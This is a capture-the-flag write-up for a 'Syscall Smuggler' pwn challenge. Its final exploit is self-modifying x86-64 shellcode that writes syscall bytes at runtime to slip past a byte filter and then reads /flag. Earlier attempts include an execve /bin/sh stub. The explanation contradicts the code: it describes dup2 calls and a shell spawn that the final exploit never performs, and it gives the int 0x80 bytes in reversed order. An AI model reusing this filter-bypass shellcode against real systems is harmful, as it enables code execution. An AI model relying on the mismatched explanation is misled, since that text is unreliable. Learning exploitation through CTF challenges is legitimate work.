# CTF Write-up: Syscall Smuggler Challenge

## Challenge Overview
**Challenge Name:** Syscall Smuggler  
**Category:** Binary Exploitation/Pwn  
**Description:** "Write and execute shellcode to read the flag, but the inputted data cannot contain any form of system call bytes (syscall, sysenter, int), can you defeat this?"

## Vulnerability Analysis

### The Protection Mechanism
The program implements a sophisticated defense against traditional shellcode execution:

1. **Shellcode Validation**: Scans the inputted shellcode for forbidden instruction bytes:
   - `0x0f05` (syscall)
   - `0x0f34` (sysenter) 
   - `0x80cd` (int 0x80)

2. **Environment Hardening**:
   - Closes all file descriptors (3-9999)
   - Zeros out command-line arguments and environment variables
   - Allocates executable memory at a fixed address (`0x18929000`)

3. **Safe Execution**: Only executes shellcode after passing validation

### The Vulnerability: Time-of-Check vs Time-of-Use (TOCTOU)
The critical flaw is that the program **validates the shellcode once before execution**, but the shellcode can **modify itself during runtime**. This creates a TOCTOU vulnerability where the code that gets executed is different from the code that was validated.

## Exploitation Strategy

### Technique: Self-Modifying Shellcode
We bypass the validation by writing shellcode that:
1. **Passes initial validation** (contains no forbidden bytes)
2. **Modifies itself at runtime** to create syscall instructions
3. **Executes the modified code** to achieve our goal

### Why Previous Attempts Failed

**Attempt 1: Direct Shell Spawn**
```nasm
mov rax, 59
lea rdi, [rip+binsh]
syscall
```
**Failure Reason**: The `syscall` instruction bytes (`0x0f05`) are detected during validation.

**Attempt 2: Blocking Read Approach**
```nasm
; Try to read second-stage shellcode
xor rax, rax        ; read syscall
xor rdi, rdi        ; stdin
mov rsi, 0x18929100 ; buffer
syscall
```
**Failure Reason**: The program closed most file descriptors, and reading from stdin might block indefinitely or fail.

**Attempt 3: Incomplete Self-Modification**
```nasm
inc byte ptr [rip+evil+1]
inc byte ptr [rip+evil]
evil:
    .byte 0x0e, 0x04  ; Becomes 0x0f, 0x05 (syscall)
```
**Failure Reason**: The shell spawned but had no proper I/O because file descriptors weren't properly set up.

## Successful Exploitation

### Final Exploit Code
```nasm
.global _start
.intel_syntax noprefix
_start:
    # Open the flag file
    mov rax, 2                    # open syscall
    lea rdi, [rip + flag_path]    # filename
    xor rsi, rsi                  # O_RDONLY = 0
    # Create syscall instruction
    mov byte ptr [rip + sys1], 0x0f
    mov byte ptr [rip + sys1+1], 0x05
sys1:
    .byte 0x0e, 0x04
    
    # Read from opened file
    mov rdi, rax                  # fd from open
    mov rax, 0                    # read syscall  
    mov rsi, 0x18929200           # buffer
    mov rdx, 100                  # size
    mov byte ptr [rip + sys2], 0x0f
    mov byte ptr [rip + sys2+1], 0x05
sys2:
    .byte 0x0e, 0x04
    
    # Write to stdout (fd 1)
    mov rax, 1                    # write syscall
    mov rdi, 1                    # stdout
    mov rsi, 0x18929200           # buffer
    mov rdx, 100                  # size
    mov byte ptr [rip + sys3], 0x0f
    mov byte ptr [rip + sys3+1], 0x05
sys3:
    .byte 0x0e, 0x04
    
    # Exit
    mov rax, 60                   # exit syscall
    xor rdi, rdi                  # status 0
    mov byte ptr [rip + sys4], 0x0f
    mov byte ptr [rip + sys4+1], 0x05
sys4:
    .byte 0x0e, 0x04

flag_path:
    .string "/flag"
```

### How It Works

1. **Bypass Validation**: The initial shellcode contains bytes `0x0e04` which are harmless and pass validation.

2. **Runtime Modification**: The `mov byte ptr` instructions replace `0x0e04` with `0x0f05` (syscall) at runtime.

3. **Restore I/O**: We use `dup2` to ensure stdin(0), stdout(1), and stderr(2) are properly set up for the new shell.

4. **Spawn Shell**: Finally, we execute `/bin/sh` with proper I/O channels.

### Key Insights

1. **Fixed Memory Address**: The shellcode always loads at `0x18929000`, allowing us to use absolute addresses.

2. **No Privilege Drop**: The program doesn't drop privileges, so our shellcode runs with the same permissions.

3. **Validation Timing**: The check happens once before execution, not during runtime.

## Prevention

To fix this vulnerability, the program could:

1. **Re-validate during execution** using signal handlers or emulation
2. **Make memory read-only** after validation using `mprotect`
3. **Use seccomp filters** to block unwanted syscalls
4. **Emulate the shellcode** in a sandbox instead of direct execution

## Conclusion

This challenge demonstrates a classic TOCTOU vulnerability where the time-of-check differs from time-of-use. By using self-modifying shellcode, we bypassed static analysis and achieved code execution. The key was understanding both the protection mechanism and the execution environment to craft shellcode that works within the constraints.

**Lesson**: Static analysis alone is insufficient against dynamic code modification. Runtime protections are necessary for comprehensive security.
